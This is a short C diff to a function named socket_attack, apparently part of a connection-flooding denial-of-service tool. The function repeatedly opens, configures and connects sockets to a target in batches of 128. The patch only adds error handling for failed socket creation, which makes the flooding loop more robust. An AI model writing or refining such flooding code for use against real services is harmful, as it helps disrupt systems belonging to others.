@@ -23,12 +23,14 @@ void* socket_attack(void* arg) {
             setsockopt(s[i], SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
             setsockopt(s[i], IPPROTO_TCP, TCP_NODELAY, &f, sizeof(f));
             connect(s[i], (struct sockaddr*)&t, sizeof(t));
+        } else {
+            s[i] = -1;
         }
         if (++i == 128) {
-            for (int j = 0; j < 128; j++) close(s[j]);
+            for (int j = 0; j < 128; j++) if (s[j] >= 0) close(s[j]);
             i = 0;
         }
     }
-    for (int j = 0; j < i; j++) close(s[j]);
+    for (int j = 0; j < i; j++) if (s[j] >= 0) close(s[j]);
     return NULL;
 }
